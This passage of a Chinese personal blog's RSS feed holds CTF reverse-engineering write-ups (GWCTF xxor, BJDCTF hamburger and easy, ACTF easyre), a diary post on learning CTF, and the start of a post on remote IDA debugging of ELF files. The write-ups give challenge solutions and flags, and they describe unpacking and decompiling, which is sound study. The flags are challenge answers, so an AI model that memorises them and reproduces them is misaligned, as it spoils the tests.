&lt;p&gt;5pqX5oGL5LqG5Zub5bm055qE5Lq65oOz6Lef5oiR5Zyo5LiA6LW377yM5byA5b+D77yB5L2G5piv5rKh5aSE5aSf5LiA5bm05ZGi5bCx5Zug5Li65byC5Zyw5YiG5LqG77yM5omA5Lul5oiR5oqK6L+Z5Y+l6K+d5pS55oiQYmFzZTY05LqG77yM55yL5Yiw6L+Z5Y+l6K+d57uZ5oiR5pW056C06Ziy5LqG&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【GWCTF 2019】xxor</title>
        <link>https://dorinxl.github.io/p/gwctf-2019xxor/</link>
        <pubDate>Mon, 18 May 2020 14:18:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/gwctf-2019xxor/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221746974-732109876.png&#34;
	width=&#34;500&#34;
	height=&#34;378&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221746974-732109876_hu5861154676630066786.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221746974-732109876_hu2619549710367848814.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;132&#34;
		data-flex-basis=&#34;317px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下载后是个elf文件，直接扔进IDA分析：&lt;/p&gt;
&lt;p&gt;Main的代码也比较简单：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747356-391040727.png&#34;
	width=&#34;470&#34;
	height=&#34;602&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747356-391040727_hu6225381519773331115.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747356-391040727_hu3035253335258538047.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;78&#34;
		data-flex-basis=&#34;187px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;根据提示，我们需要输入六个数据，在经过两处处理之后得到一段数据，最后将其转换为十六进制在转成字符串。&lt;/p&gt;
&lt;p&gt;第一部分处理：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747644-2037851907.png&#34;
	width=&#34;444&#34;
	height=&#34;130&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747644-2037851907_hu2122217844397938275.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747644-2037851907_hu5254296943030540510.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;341&#34;
		data-flex-basis=&#34;819px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里是将输入的六个数据第一次处理，三次循环，每次取两个数据出来存到dword_601078和dword_60107C中。&lt;/p&gt;
&lt;p&gt;sub_400686对每次取出的第一个数据进行再处理，byte_601060里面存放的是四个数据：2，2，3，4。&lt;/p&gt;
&lt;p&gt;我们进去sub_400686函数内部：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747846-1008997915.png&#34;
	width=&#34;564&#34;
	height=&#34;356&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747846-1008997915_hu8026480761922836313.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221747846-1008997915_hu8827296758101244184.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;158&#34;
		data-flex-basis=&#34;380px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;需要注意的地方是，a3取到了a1[0]，a4取到了a1[1]，其实就是在外面循环中每次取入的两个数据。&lt;/p&gt;
&lt;p&gt;在函数内部经过六十四次运算之后，将得到的结果存入a1[0]和a1[1]，返回外面的循环。&lt;/p&gt;
&lt;p&gt;在之后便是把这两个处理过的数据放进v11数组中。这个地方的第二个数据其实已经发生了变化，地址存放的数据已经改变了。&lt;/p&gt;
&lt;p&gt;第二个处理便是：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748025-2033079780.png&#34;
	width=&#34;312&#34;
	height=&#34;81&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748025-2033079780_hu11444635440190115353.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748025-2033079780_hu13508362004617741163.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;385&#34;
		data-flex-basis=&#34;924px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里需要进入sub_400770内部查看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748253-40301534.png&#34;
	width=&#34;762&#34;
	height=&#34;342&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748253-40301534_hu8451545196767945855.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748253-40301534_hu15551352212490078896.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;534px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里比较简单了，用计算器算一下这六个数，这六个数就是上面一层数据处理之后应该得到的结果。&lt;/p&gt;
&lt;p&gt;那么需要我们逆向的就是通过这六个数反推我们应该输入的六个数，大体流程比较简单（不会贴代码只好放图）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748657-1189668752.png&#34;
	width=&#34;901&#34;
	height=&#34;511&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748657-1189668752_hu6843699510273388712.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748657-1189668752_hu13833275015679361054.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;176&#34;
		data-flex-basis=&#34;423px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我在写程序的时候发现对数据定义的不同会造成不同的结果。比如我对数组a[6]定义成unsigned int 和long int就完全不一样。&lt;/p&gt;
&lt;p&gt;之前学C的时候没怎么注意过数据范围，搞算法竞赛的时候也只是随手丢一个long long，为什么会出现差别呢？我觉得其中的细节值得深究一下。&lt;/p&gt;
&lt;p&gt;跑出来的结果：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748926-1450179145.png&#34;
	width=&#34;339&#34;
	height=&#34;27&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748926-1450179145_hu9680135066550355660.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221748926-1450179145_hu3880484940127333631.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1255&#34;
		data-flex-basis=&#34;3013px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;666c61677b72655f69735f6772656174217d&lt;/p&gt;
&lt;p&gt;用在线网站转化一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221749148-1186555577.png&#34;
	width=&#34;841&#34;
	height=&#34;321&#34;
	srcset=&#34;https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221749148-1186555577_hu10182170085672956811.png 480w, https://dorinxl.github.io/p/gwctf-2019xxor/1858293-20200518221749148-1186555577_hu9477083483947413193.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;261&#34;
		data-flex-basis=&#34;628px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;flag{re_is_great!}&lt;/p&gt;
&lt;p&gt;好了今天的思修笔记还没写，已经十点多了应该来得及。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【BJDCTF2020】BJD hamburger competition</title>
        <link>https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/</link>
        <pubDate>Sun, 17 May 2020 08:22:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162206946-1646269906.png&#34;
	width=&#34;500&#34;
	height=&#34;440&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162206946-1646269906_hu4549457728936591360.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162206946-1646269906_hu6297500852011037642.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;113&#34;
		data-flex-basis=&#34;272px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下载下来解压后发现是一个unity的···游戏？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207263-1211339565.png&#34;
	width=&#34;254&#34;
	height=&#34;109&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207263-1211339565_hu7191429811048674422.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207263-1211339565_hu255214567930355299.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;559px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;由于unity是用C#开发，这里我们就不去用IDA了，用dnspy看源码就够了。&lt;/p&gt;
&lt;p&gt;在BJD hamburger competition_Data\Managed文件夹中找到Assembly-
CSharp.dll&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207458-2108081414.png&#34;
	width=&#34;169&#34;
	height=&#34;22&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207458-2108081414_hu7042527971319728050.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207458-2108081414_hu13526078128547844552.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;768&#34;
		data-flex-basis=&#34;1843px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个dll文件是程序的源码，用来存放C#工程。&lt;/p&gt;
&lt;p&gt;把它拖进dnspy：找到有用的ButtonSpawnFruit类：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207781-212275625.png&#34;
	width=&#34;249&#34;
	height=&#34;444&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207781-212275625_hu16771574439745927680.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162207781-212275625_hu12889549101529206327.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;56&#34;
		data-flex-basis=&#34;134px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在里面发现了有关flag的判断条件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208265-1648412496.png&#34;
	width=&#34;645&#34;
	height=&#34;802&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208265-1648412496_hu11268000491407866393.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208265-1648412496_hu3110173444363279456.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;80&#34;
		data-flex-basis=&#34;193px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;总的来说就是选择五个小憨包的原料，然后构成str，这个str的sha1哈希值有了，扔进在线解密网站解出来是1001。&lt;/p&gt;
&lt;p&gt;下一步就是把1001进行MD5一下，最初我把md5直接提交发现不对，于是点进函数内看了看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208651-2066780171.png&#34;
	width=&#34;826&#34;
	height=&#34;266&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208651-2066780171_hu17056318795455567805.png 480w, https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/1858293-20200517162208651-2066780171_hu10575847081113356234.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;310&#34;
		data-flex-basis=&#34;745px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;MD5加密后改成大写，取0-20位输出：&lt;/p&gt;
&lt;p&gt;B8C37E33DEFDE51CF91E&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【BJDCTF2020】easy</title>
        <link>https://dorinxl.github.io/p/bjdctf2020easy/</link>
        <pubDate>Sun, 17 May 2020 03:48:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/bjdctf2020easy/</guid>
        <description>&lt;p&gt;先查壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812198-1245883399.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812198-1245883399_hu16063592433358103915.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812198-1245883399_hu10666058776941331195.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;无壳，跑一下看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812674-280831908.png&#34;
	width=&#34;182&#34;
	height=&#34;62&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812674-280831908_hu3361241298637389025.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812674-280831908_hu14761944848033451349.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;293&#34;
		data-flex-basis=&#34;704px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;没有输入的地方，根据这句&amp;quot;Can you find me?&amp;ldquo;我们大致推测，数据是被藏起来了，通过正常手法应该找不到。&lt;/p&gt;
&lt;p&gt;拖进IDA看看，main函数并没什么用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812981-31514688.png&#34;
	width=&#34;465&#34;
	height=&#34;188&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812981-31514688_hu18074928078198460569.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114812981-31514688_hu3957467233119967897.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;247&#34;
		data-flex-basis=&#34;593px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;打开strings窗口看看，挨个点了一圈也没什么有用的数据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813347-83548081.png&#34;
	width=&#34;572&#34;
	height=&#34;249&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813347-83548081_hu5423102043181965522.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813347-83548081_hu17851093162197128720.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;229&#34;
		data-flex-basis=&#34;551px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;最后在这个_ques函数里面找到了：&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813703-1451877360.png&#34;
	width=&#34;166&#34;
	height=&#34;31&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813703-1451877360_hu11026268378096402280.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114813703-1451877360_hu2617298432513303221.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;535&#34;
		data-flex-basis=&#34;1285px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814077-126678717.png&#34;
	width=&#34;573&#34;
	height=&#34;603&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814077-126678717_hu10059735641277040766.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814077-126678717_hu4159106202444615792.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;95&#34;
		data-flex-basis=&#34;228px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;分析一波，给出十个数据，然后进行拼接到v14上，HIDWORD是高16位，LODWORD是低16位，有点寄存器的意思？&lt;/p&gt;
&lt;p&gt;查了一波资料发现这是宏定义：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814540-833382538.png&#34;
	width=&#34;729&#34;
	height=&#34;364&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814540-833382538_hu157837533944499833.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114814540-833382538_hu24544549323937924.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;200&#34;
		data-flex-basis=&#34;480px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;那就好办了，十个数据组成五个数据，然后把这五个数据按二进制存储，对每位进行分析，是1输出*，是0输出空格，该回车回车：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815041-117651555.png&#34;
	width=&#34;569&#34;
	height=&#34;377&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815041-117651555_hu1923531210378552850.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815041-117651555_hu4068563889633907703.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;150&#34;
		data-flex-basis=&#34;362px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;运行一下是一副画（flag）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815331-1754028536.png&#34;
	width=&#34;490&#34;
	height=&#34;90&#34;
	srcset=&#34;https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815331-1754028536_hu143138600009696089.png 480w, https://dorinxl.github.io/p/bjdctf2020easy/1858293-20200517114815331-1754028536_hu8785040021981565456.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;544&#34;
		data-flex-basis=&#34;1306px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;HACKIT4FUN&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【ACTF新生赛2020】easyre</title>
        <link>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/</link>
        <pubDate>Sat, 16 May 2020 09:09:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/</guid>
        <description>&lt;p&gt;先查壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170831953-1070650257.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170831953-1070650257_hu14651557424844365541.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170831953-1070650257_hu16005186167337501299.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;UPX壳，脱壳后扔进IDA&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832343-2035690429.png&#34;
	width=&#34;474&#34;
	height=&#34;119&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832343-2035690429_hu6719259123030477936.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832343-2035690429_hu8556263775346451733.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;398&#34;
		data-flex-basis=&#34;955px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;弹出的提示无伤大雅，直接F5&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832626-633795168.png&#34;
	width=&#34;727&#34;
	height=&#34;483&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832626-633795168_hu8963266460295439398.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170832626-633795168_hu990434629740154394.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;150&#34;
		data-flex-basis=&#34;361px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;逻辑很简单，开头是ACFT{，最后是}，给出的v4数组和byte_402000数组比较，取出byte数组中的下表进行减法得到flag的ascii值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833175-1200582339.png&#34;
	width=&#34;561&#34;
	height=&#34;575&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833175-1200582339_hu18281103690014482781.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833175-1200582339_hu3115507319510757977.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;97&#34;
		data-flex-basis=&#34;234px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Flag:&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833571-1412759519.png&#34;
	width=&#34;111&#34;
	height=&#34;26&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833571-1412759519_hu1351618114112588955.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/1858293-20200516170833571-1412759519_hu4126130275447169597.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;426&#34;
		data-flex-basis=&#34;1024px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2020.5.16 15：06</title>
        <link>https://dorinxl.github.io/p/2020.5.16-1506/</link>
        <pubDate>Sat, 16 May 2020 09:08:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/2020.5.16-1506/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806738-310589045.png" alt="Featured image of post 2020.5.16 15：06" /&gt;&lt;p&gt;天气阴沉闷热，像是要下雨，不想写物理了就来照顾一下博客。&lt;/p&gt;
&lt;p&gt;在此之前，我花了一个星期的时间专注于补作业，ctf的知识一点没有进展。&lt;/p&gt;
&lt;p&gt;疫情关系，在家慢慢刷题，参加了各种线上赛事，包括但不限于协会内部赛、其他学校公开赛、高校战疫、xctf、安恒月赛、网鼎杯等。&lt;/p&gt;
&lt;p&gt;基本就是在BUU和XCTF上刷题。&lt;/p&gt;
&lt;p&gt;解决的第一个ctf题是在2019.11.03，题目来自xctf，是一道逆向题。从此专注于逆向。但到目前为止半年出头，进展极小。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806061-180706797.png&#34;
	width=&#34;370&#34;
	height=&#34;39&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806061-180706797_hu7916442906302338240.png 480w, https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806061-180706797_hu15238546204813351036.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;948&#34;
		data-flex-basis=&#34;2276px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;最好的赛事名次大概是网鼎杯563名，和学校的几个伙伴们一起。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806738-310589045.png&#34;
	width=&#34;483&#34;
	height=&#34;517&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806738-310589045_hu16315972076091277362.png 480w, https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806738-310589045_hu11350001983166376145.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;93&#34;
		data-flex-basis=&#34;224px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;仔细想想，每天都有时间做新题，自己也有保存新题的习惯，为什么不把这些题的wp每天都记录一下呢？&lt;/p&gt;
&lt;p&gt;所以，为了充实自己的博客，记录一下刷题记录和生活，我决定在这个模块里专门存放刷下来的wp，以供自己和其他人参考。尽量每天最少一个。&lt;/p&gt;
&lt;p&gt;希望今年结束的时候可以变强吧，那个时候应该是大二中期，大学生活的3/8了。&lt;/p&gt;
&lt;p&gt;加油！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>由一道逆向题而引发，IDA调试ELF文件</title>
        <link>https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/</link>
        <pubDate>Sun, 19 Apr 2020 10:19:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;p&gt;通过suctf-2016的一道题：serial-150而引发的一系列问题与解决方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;这道题目怎么解：&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本意是想通过解决这道题来学习新知识，确实学到了。&lt;/p&gt;
&lt;p&gt;IDA打开后发现无法反编译，此时我想，如果是exe的话我可以用od动态调试，可是elf该用什么呢？linux上有专门的调试工具，可我都没怎么用过。&lt;/p&gt;
&lt;p&gt;在网上搜寻wp后发现用的是IDA通过远程连接linux来调试elf文件，那么问题来了，我不会。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;IDA远程动态调试ELF文件&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因为还没有研究《IDA Pro权威指南》，暂时跟着网上的来。&lt;/p&gt;
&lt;p&gt;综合了多家博客的方式，我也算终于摸索出来如何实现IDA远程调试ELF文件。&lt;/p&gt;
&lt;p&gt;从效果上看，IDA在我主机上运行，通过设置连接到了虚拟机的linux系统上，实现了主机调试，虚拟机运作的这么一种方式。原理暂不明白。&lt;/p&gt;
